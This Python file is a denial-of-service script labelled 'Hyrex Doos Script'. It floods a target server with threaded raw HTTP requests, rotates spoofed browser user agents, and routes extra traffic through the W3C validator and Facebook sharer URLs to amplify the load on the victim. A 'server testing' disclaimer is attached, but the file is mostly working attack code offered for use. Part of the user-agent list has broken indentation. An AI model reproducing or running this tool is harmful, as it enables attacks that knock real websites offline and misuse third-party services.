# Coder By Hyrex


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1")
        uagent.append("Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
            uagent.append("Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0")
            uagent.append("Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1")
            uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2")
            uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")
            uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3")
            uagent.append("Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0")
            uagent.append("Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20")
            uagent.append("Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a")
            uagent.append("Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2")
            uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34")
            uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1")
            uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2")
            uagent.append("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
            uagent.append("Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0")
            uagent.append("Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0")
            uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24")
            uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1")
            uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
            uagent.append("Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre")
            uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mbot is hammering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! ddos--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Hyrex Doos Script
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 ddosatchyrex.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
	-t : turbo default 135 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="ddosatc")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
